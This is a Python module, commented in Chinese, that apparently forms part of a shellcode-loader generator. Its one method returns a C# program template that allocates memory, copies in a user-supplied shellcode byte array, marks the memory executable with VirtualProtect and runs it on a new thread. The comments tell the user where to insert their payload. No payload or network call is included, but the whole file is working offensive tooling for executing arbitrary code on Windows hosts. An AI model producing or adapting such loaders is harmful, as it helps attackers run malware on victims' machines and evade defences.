#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C# 原始加载器模块：单一职责 - 生成C#原始加载器代码（无解密，直接运行）
"""

class CSharpRawLoader:
    """C# 原始加载器（无解密，直接加载运行 Shellcode，适用于未加密 Shellcode）"""
    @staticmethod
    def generate_raw(shellcode_len: int) -> str:
        """生成 C# 原始加载器代码"""
        loader_template = f"""
using System;
using System.Runtime.InteropServices;

namespace ShellcodeLoader
{{
    class Program
    {{
        // 导入 Windows API（用于内存分配与执行）
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // 常量定义（内存分配与保护属性）
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint INFINITE = 0xFFFFFFFF;

        static void Main(string[] args)
        {{
            // 请将格式化后的原始 Shellcode 填入此处（替换下方的 new byte[{shellcode_len}]）
            byte[] shellcode = new byte[{shellcode_len}];

            // 1. 分配可读写内存
            IntPtr allocAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (allocAddr == IntPtr.Zero)
            {{
                Console.WriteLine("内存分配失败");
                return;
            }}

            // 2. 将 Shellcode 写入分配的内存
            Marshal.Copy(shellcode, 0, allocAddr, shellcode.Length);

            // 3. 修改内存属性为可执行
            uint oldProtect;
            bool protectResult = VirtualProtect(allocAddr, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
            if (!protectResult)
            {{
                Console.WriteLine("内存属性修改失败");
                return;
            }}

            // 4. 创建并执行线程（运行 Shellcode）
            uint threadId;
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, out threadId);
            if (threadHandle == IntPtr.Zero)
            {{
                Console.WriteLine("线程创建失败");
                return;
            }}

            // 5. 等待线程执行完成
            WaitForSingleObject(threadHandle, INFINITE);
        }}
    }}
}}
"""
        return loader_template.strip()
